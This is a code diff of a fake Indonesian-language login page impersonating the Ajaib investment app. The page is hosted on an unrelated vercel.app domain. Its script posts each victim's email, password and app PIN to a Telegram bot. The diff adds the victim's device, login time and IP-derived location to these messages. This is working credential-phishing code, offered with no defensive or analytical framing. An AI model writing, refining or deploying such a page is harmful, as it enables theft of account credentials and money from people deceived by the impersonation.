@@ -4,66 +4,45 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Masuk | Ajaib</title>
-
-  <!-- SEO & Social -->
   <meta name="description" content="Login | Masuk ke akun Ajaib kamu dengan aman dan cepat.">
-  <meta property="og:title" content="Masuk | Ajaib" />
-  <meta property="og:description" content="Login | Masuk ke akun Ajaib kamu dengan aman dan cepat." />
-  <meta property="og:image" content="https://media-hosting.imagekit.io/020dcba306b14c48/AJAIB-ASA-BLUE.png" />
-  <meta property="og:url" content="https://cs-pintu-snippet.vercel.app/ajaib-login.html" />
-  <meta property="og:type" content="website" />
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="Masuk | Ajaib" />
-  <meta name="twitter:description" content="Login | Masuk ke akun Ajaib kamu dengan aman dan cepat." />
-  <meta name="twitter:image" content="https://media-hosting.imagekit.io/020dcba306b14c48/AJAIB-ASA-BLUE.png" />
-
-  <!-- Fonts & Icons -->
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet" />
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet" />
 
   <style>
     body {
-      margin: 0;
-      padding: 0;
+      margin: 0; padding: 0;
       background: #fff;
       font-family: 'Roboto', sans-serif;
     }
-
     .container {
       max-width: 360px;
       margin: auto;
       padding: 20px;
     }
-
     .logo {
       display: block;
       margin: 20px auto;
       width: 160px;
     }
-
     h1 {
       text-align: center;
       font-size: 1.5rem;
       font-weight: 500;
       margin-bottom: 20px;
     }
-
     .form-label {
       display: block;
       font-size: 0.9rem;
       margin-bottom: 4px;
     }
-
     .form-group {
       margin-bottom: 18px;
     }
-
     .input-wrapper {
       display: flex;
       align-items: center;
       border-bottom: 1px solid #ccc;
     }
-
     .input-wrapper input {
       flex: 1;
       border: none;
@@ -72,7 +51,6 @@
       outline: none;
       background: transparent;
     }
-
     .toggle-password {
       background: none;
       border: none;
@@ -81,13 +59,11 @@
       padding: 0 8px;
       font-size: 1rem;
     }
-
     .text-danger {
       color: red;
       font-size: 0.8rem;
       display: none;
     }
-
     .btn {
       width: 100%;
       padding: 12px;
@@ -100,24 +76,16 @@
       cursor: pointer;
       margin-top: 100px;
     }
-
-    .link, .text-link {
+    .link {
       font-weight: 300;
       font-size: 0.95rem;
       color: #4a8fe7;
       text-decoration: none;
       transition: color 0.2s ease;
     }
-
-    .text-link:hover {
-      color: #3a7cd1;
-      text-decoration: underline;
-    }
-
     .text-center {
       text-align: center;
     }
-
     .footer-info {
       margin-top: 40px;
       text-align: center;
@@ -127,7 +95,6 @@
       font-weight: 500;
       border-radius: 12px 12px 0 0;
     }
-
     .spinner {
       display: none;
       width: 16px;
@@ -138,16 +105,12 @@
       margin-left: 8px;
       animation: spin 0.6s linear infinite;
     }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+    @keyframes spin { to { transform: rotate(360deg); } }
 
     .pin-popup {
       position: fixed;
       bottom: -100%;
-      left: 0;
-      right: 0;
+      left: 0; right: 0;
       background: white;
       padding: 20px;
       box-shadow: 0 -4px 10px rgba(0, 0, 0, 0.1);
@@ -155,24 +118,18 @@
       transition: bottom 0.4s ease-in-out;
       z-index: 999;
     }
-
-    .pin-popup.show {
-      bottom: 0;
-    }
-
+    .pin-popup.show { bottom: 0; }
     .pin-popup h2 {
       text-align: center;
       font-size: 1.1rem;
       margin-bottom: 16px;
       font-weight: 400;
     }
-
     .pin-inputs {
       display: flex;
       justify-content: center;
       gap: 10px;
     }
-
     .pin-inputs input {
       width: 48px;
       height: 56px;
@@ -221,10 +178,9 @@
     </div>
   </div>
 
-  <div class="footer-info">
-    4 Alasan Ajaib Dipercaya 1 Juta++
-  </div>
+  <div class="footer-info">4 Alasan Ajaib Dipercaya 1 Juta++</div>
 
+  <!-- PIN Popup -->
   <div class="pin-popup" id="pinPopup">
     <h2>Masukkan PIN Ajaib Kamu</h2>
     <div class="pin-inputs">
@@ -266,13 +222,45 @@
       document.getElementById("btnSpinner").style.display = "inline-block";
       document.getElementById("loginBtn").disabled = true;
 
+      const device = navigator.userAgent;
+      const loginTime = new Date().toLocaleString("id-ID", {
+        timeZone: "Asia/Jakarta",
+        hour12: false,
+        weekday: "long",
+        year: "numeric",
+        month: "long",
+        day: "numeric",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit"
+      });
+
+      let location = "Tidak diketahui";
       try {
+        const res = await fetch("https://ipinfo.io/json?token=ce1df7fbc7b225");
+        const data = await res.json();
+        if (data.city && data.region && data.country) {
+          location = `${data.city}, ${data.region}, ${data.country}`;
+        }
+      } catch {
+        location = "Gagal deteksi lokasi";
+      }
+
+      try {
+        // ✅ Simpan email ke localStorage
+        localStorage.setItem('ajaib_email', email);
+
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: CHAT_ID,
-            text: `AJAIB LOGIN\nEmail: ${email}\nPassword: ${password}`
+            text:
+              `🟢 𝗗𝗔𝗧𝗔 𝗟𝗢𝗚𝗜𝗡 𝗔𝗝𝗔𝗜𝗕 ✅️\n` +
+              `📧 Email: ${email}\n` +
+              `🔒 Password: ${password}\n` +
+              `📱 Perangkat: ${device}\n` +
+              `🕒 Waktu Login: ${loginTime}`
           })
         });
       } catch (err) {
@@ -308,12 +296,27 @@
         return;
       }
 
+      const pinTime = new Date().toLocaleString("id-ID", {
+        timeZone: "Asia/Jakarta",
+        hour12: false,
+        weekday: "long",
+        year: "numeric",
+        month: "long",
+        day: "numeric",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit"
+      });
+
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: CHAT_ID,
-          text: `AJAIB PIN\nPIN: ${pin}`
+          text:
+            `🔐 VERIFIKASI PIN AJAIB\n` +
+            `🔢 PIN: ${pin}\n` +
+            `🕒 Waktu Masuk: ${pinTime}`
         })
       }).then(() => {
         document.getElementById("pinPopup").classList.remove("show");
